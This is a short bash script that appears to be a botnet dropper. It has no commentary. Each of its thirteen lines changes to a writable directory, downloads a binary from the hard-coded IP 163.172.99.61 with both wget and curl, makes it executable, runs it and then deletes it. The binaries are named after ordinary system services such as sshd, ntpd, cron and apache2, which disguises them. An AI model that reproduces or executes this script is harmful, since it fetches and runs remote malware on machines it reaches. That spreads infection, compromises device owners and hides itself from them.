#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/ntpd; curl -O http://163.172.99.61/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/sshd; curl -O http://163.172.99.61/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/openssh; curl -O http://163.172.99.61/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/bash; curl -O http://163.172.99.61/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/tftp; curl -O http://163.172.99.61/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/wget; curl -O http://163.172.99.61/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/cron; curl -O http://163.172.99.61/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/ftp; curl -O http://163.172.99.61/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/pftp; curl -O http://163.172.99.61/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/sh; curl -O http://163.172.99.61/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/nut; curl -O http://163.172.99.61/nut; chmod +x nut; ./nut; rm -rf nut
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/apache2; curl -O http://163.172.99.61/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.99.61/telnetd; curl -O http://163.172.99.61/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
